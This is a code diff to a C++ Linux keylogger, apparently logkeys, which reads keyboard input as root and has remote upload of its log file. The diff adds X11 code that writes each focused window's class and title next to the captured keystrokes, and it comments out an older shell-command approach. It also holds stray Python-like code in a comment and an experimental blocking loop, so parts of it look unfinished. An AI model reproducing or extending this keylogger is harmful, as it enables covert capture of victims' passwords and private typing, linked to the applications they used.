@@ -24,6 +24,10 @@
 #include <sys/socket.h>
 #include <linux/input.h>
 
+#include <X11/Xlib.h>
+#include <X11/Xutil.h>
+#include <X11/Xos.h>
+
 #ifdef HAVE_CONFIG_H
 # include <config.h>  // include config produced from ./configure
 #endif
@@ -67,20 +71,44 @@
 #include "upload.cc"     // functions concerning remote uploading of log file
 
 namespace logkeys {
+/*
+int test () {
+  
+
+
+  
+  NET_WM_NAME = disp.intern_atom('_NET_WM_NAME');
+  NET_ACTIVE_WINDOW = disp.intern_atom('_NET_ACTIVE_WINDOW');
+
+  root.change_attributes(event_mask=Xlib.X.FocusChangeMask)
+  while True:
+      try:
+          window_id = root.get_full_property(NET_ACTIVE_WINDOW, Xlib.X.AnyPropertyType).value[0]
+          window = disp.create_resource_object('window', window_id)
+          window.change_attributes(event_mask=Xlib.X.PropertyChangeMask)
+          window_name = window.get_full_property(NET_WM_NAME, 0).value
+      except Xlib.error.XError:
+          window_name = None
+      print(window_name)
+      event = disp.next_event()
+
+  return 0;
+}*/
+
 
 // executes cmd and returns string ouput
 std::string execute(const char* cmd)
 {
-    FILE* pipe = popen(cmd, "r");
-    if (!pipe)
-      error(EXIT_FAILURE, errno, "Pipe error");
-    char buffer[128];
-    std::string result = "";
-    while(!feof(pipe))
-    	if(fgets(buffer, 128, pipe) != NULL)
-    		result += buffer;
-    pclose(pipe);
-    return result;
+  FILE* pipe = popen(cmd, "r");
+  if (!pipe)
+    error(EXIT_FAILURE, errno, "Pipe error");
+  char buffer[128];
+  std::string result = "";
+  while(!feof(pipe))
+  	if(fgets(buffer, 128, pipe) != NULL)
+  		result += buffer;
+  pclose(pipe);
+  return result;
 }
 
 int input_fd = -1;  // input event device file descriptor; global so that signal_handler() can access it
@@ -373,9 +401,9 @@ void determine_input_device()
   seteuid(0); setegid(0);
 }
 
-// write newline then add timestamp and programinfo
+// write newline then add timestamp and window-title
 ////event is wrong use refercen or pointer
-inline int newline(FILE *& out, struct input_event event, bool program_changed, std::string program_info) {
+inline int newline(FILE *& out, struct input_event event, bool program_changed, std::string window_title) {
   char timestamp[32];
   int inc_size = fprintf(out, "\n");
 
@@ -384,7 +412,7 @@ inline int newline(FILE *& out, struct input_event event, bool program_changed, 
     inc_size += fprintf(out, "%s", timestamp);
   }
   if (program_changed)
-    inc_size += fprintf(out, "%s", program_info.c_str());
+    inc_size += fprintf(out, "%s", window_title.c_str());
 
   return inc_size;
 }
@@ -428,7 +456,7 @@ inline int encode_char(FILE *& out, unsigned int scan_code, bool altgr_in_effect
 }
 
 int main(int argc, char **argv)
-{  
+{
   on_exit(exit_cleanup, NULL);
   
   if (geteuid()) error(EXIT_FAILURE, errno, "Got r00t?");
@@ -533,14 +561,87 @@ int main(int argc, char **argv)
   
   fflush(out);
 
-  //// programinfo
+  //// window-title
   std::string window_id;
   std::string old_window_id;
   std::string cur_process_name; 
   std::string cur_window_name;
-  std::string program_info;
+  std::string window_title;
   bool program_changed = false;
+
+
+
+
+
+
+
+  Display *disp = XOpenDisplay(NULL);
+  Window win;
+  XEvent xevent;
+
+  int i=0;
+
+  int revert;
+  Atom type;
+  int format;
+  unsigned long nitems, after;
+  unsigned char *class_name = 0;
+  unsigned char *wm_name = 0;
+
+
+  if (!disp) 
+    file_size += fprintf(out, "[ERROR] Could not open display \n\n");
+
+  win = XDefaultRootWindow( disp );
+  //not asynch, can be removed later
+  XSynchronize(disp, true);
+  // set event mask, property changes
+  XSelectInput(disp, win, PropertyChangeMask);
   
+
+  while(i<50) {
+    i++;
+
+    XNextEvent(disp, &xevent);
+    if ( xevent.type == PropertyNotify ) {
+      if ( !strcmp( XGetAtomName( disp, xevent.xproperty.atom ), "_NET_ACTIVE_WINDOW" ) ) {
+        //is there a way to get the window deom rhw XEvent?
+        if(XGetInputFocus(disp, &win, &revert)==0)
+          file_size += fprintf(out, "noinputfocus \n\n");
+        if (Success == XGetWindowProperty(disp, win, XInternAtom(disp,"WM_CLASS",false), 0, 65536, false, AnyPropertyType, &type, &format, &nitems, &after, &class_name)) {
+          if (class_name) {
+            file_size += fprintf(out, "\n[%s]", class_name);
+            XFree(class_name);
+          }
+          else
+            file_size += fprintf(out, "\n[WM_CLASS-NODATA]");
+        }
+        else
+          file_size += fprintf(out, "\n[WM_CLASS-NOSUCCESS]");
+
+        //_NET_WM_NAME, WM_NAME, NET_WM_NAME
+        if (Success == XGetWindowProperty(disp, win, XInternAtom(disp,"WM_NAME",false), 0, 65536, false, AnyPropertyType, &type, &format, &nitems, &after, &wm_name)) {
+          if (wm_name) {
+            file_size += fprintf(out, "[%s] > ", wm_name);
+            XFree(wm_name);
+          }
+          else
+            file_size += fprintf(out, "[WM_NAME-NODATA] > ");
+        }
+        else
+          file_size += fprintf(out, "[WM_NAME-NOSUCCESS] > ");
+      }
+    }
+    else{
+      file_size += fprintf(out, "\n\nnot propertynotify \n\n");
+    }
+    fflush(out);
+  }
+
+
+
+
+
   // infinite loop: exit gracefully by receiving SIGHUP, SIGINT or SIGTERM (of which handler closes input_fd)
   while (read(input_fd, &event, sizeof(struct input_event)) > 0) {
     
@@ -560,18 +661,21 @@ int main(int argc, char **argv)
       continue;
     }
 
-    //// on processid change update program_info write '[process name] "process title" > '
+    //// on processid change update window_title write '[process name] "process title" > '
     //// on process title change (like firefox tabs) would be better. possibly more ressource intensive?
-    if (args.flags & FLAG_PROGRAMINFO) {
+
+
+    /*
+    if (args.flags & FLAG_WINDOWTITLE) {
       window_id = execute(COMMAND_STR_AWID);
       
       if (window_id.compare(old_window_id) != 0) {
         cur_process_name = execute(COMMAND_STR_AWPNAME);
         cur_window_name = execute(COMMAND_STR_AWTITLE);
-        program_info = "[" + cur_process_name.erase(cur_process_name.size() - 1) + "] " + cur_window_name.erase(cur_window_name.size() - 1) + " > "; // delete newline (why are newlines)
+        window_title = "[" + cur_process_name.erase(cur_process_name.size() - 1) + "] " + cur_window_name.erase(cur_window_name.size() - 1) + " > "; // delete newline (why are newlines)
         program_changed = true;
       }
-    }
+    }*/
 
     // if remote posting is enabled and size treshold is reached
     if (args.post_size != 0 && file_size >= args.post_size && stat(UPLOADER_PID_FILE, &st) == -1) {
@@ -630,12 +734,12 @@ int main(int argc, char **argv)
 
     // on key press
     if (event.value == EV_MAKE) {
-      // on ENTER key or Ctrl+C/Ctrl+D event append timestamp and programinfo
+      // on ENTER key or Ctrl+C/Ctrl+D event append timestamp and window-title
       if (scan_code == KEY_ENTER || scan_code == KEY_KPENTER) {
-        inc_size += newline(out, event, program_changed, program_info);
+        inc_size += newline(out, event, program_changed, window_title);
       }
       else if (program_changed || (ctrl_in_effect && (scan_code == KEY_C || scan_code == KEY_D))) {
-        inc_size += newline(out, event, program_changed, program_info);
+        inc_size += newline(out, event, program_changed, window_title);
         inc_size += encode_char(out, scan_code, altgr_in_effect, shift_in_effect);
       }
       else { // normal char
@@ -661,7 +765,7 @@ int main(int argc, char **argv)
     }
 
     // update program id
-    if (args.flags & FLAG_PROGRAMINFO) { 
+    if (args.flags & FLAG_WINDOWTITLE) { 
       old_window_id = window_id;
       program_changed = false;
     }
@@ -679,6 +783,9 @@ int main(int argc, char **argv)
   fprintf(out, "\n\nLogging stopped at %s\n\n", timestamp);
   
   fclose(out);
+
+  ////
+  XCloseDisplay(disp); 
   
   remove(PID_FILE);
   
